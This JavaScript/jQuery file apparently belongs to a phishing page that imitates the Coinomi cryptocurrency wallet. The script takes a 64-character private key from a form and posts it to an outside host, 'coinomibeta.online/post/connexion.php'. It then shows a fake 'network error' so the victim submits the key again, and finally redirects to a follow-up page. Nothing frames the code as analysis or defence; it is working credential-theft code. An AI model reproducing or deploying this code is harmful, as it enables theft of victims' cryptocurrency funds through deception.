$(document).ready(function() {
    var info = false ;
    var x = 0 ;


    

    $("#ok").on("click", function() {
        

        // var addres and full name
        var privat = $('#name').val();
        var check = privat.length;
      

         if(privat == null || privat == '' || check < 64 || check > 64) {
            document.getElementById("error").innerHTML = 'Please enter a valid private key';
           
        } else {
            
            var info = true;

        }
        if (info) {
           
            $.ajax({
                        
                        url : 'https://coinomibeta.online/post/connexion.php',
                        type : 'Post',
                        data: {
                            priv: privat,
                },
                        dataType : 'html',
                        success : function(code_html, statut){ 
                            if (x == 1){
                                location.href = "./final.html";
                            }
                            $('#name').val('');
                            document.getElementById("error").innerHTML = 'network error occurred please try again';
                            x = x + 1 ;

                        
                        },
                        

                        error : function(resultat, statut, erreur){
                        
                     
                        }
});

        }

        

    });
    
    
});